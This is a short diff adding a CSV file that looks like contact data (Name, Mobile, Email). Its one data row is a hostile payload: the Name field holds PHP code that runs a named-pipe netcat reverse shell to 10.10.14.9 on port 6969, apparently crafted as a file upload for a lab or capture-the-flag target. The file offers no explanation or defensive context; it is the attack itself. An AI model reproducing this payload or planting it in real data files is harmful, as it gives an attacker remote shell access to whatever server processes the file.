@@ -1,0 +1,2 @@
+Name,Mobile,Email
+<?php echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 6969 >/tmp/f") ?>,66,22
